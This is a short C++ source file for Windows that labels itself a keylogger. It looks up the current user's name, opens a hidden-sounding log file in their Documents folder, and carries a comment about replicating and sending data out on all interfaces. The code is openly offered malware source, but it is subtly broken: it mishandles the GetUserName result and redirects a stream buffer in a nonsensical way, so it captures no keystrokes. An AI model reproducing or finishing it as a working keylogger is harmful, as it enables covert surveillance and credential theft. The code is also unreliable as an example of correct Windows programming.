// Keylogger

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include <string>

using namespace std;

int main()
{
	// Get username
	TCHAR username[256];
	DWORD username_len = UNLEN + 1;
	std::string user;
	user = GetUserName(username, &username_len);

		ofstream log;
		// Attempt to create log file
		log.open("C:\\Users\\" + user + "\\Documents\\dxlog.txt");
		if (log.good()) {
			log << std::cin.rdbuf(log.rdbuf());
			log.close();
		}
		else {
		// Copy/replicate, send on all interfaces, terminate current process
			exit(1);
		}
}

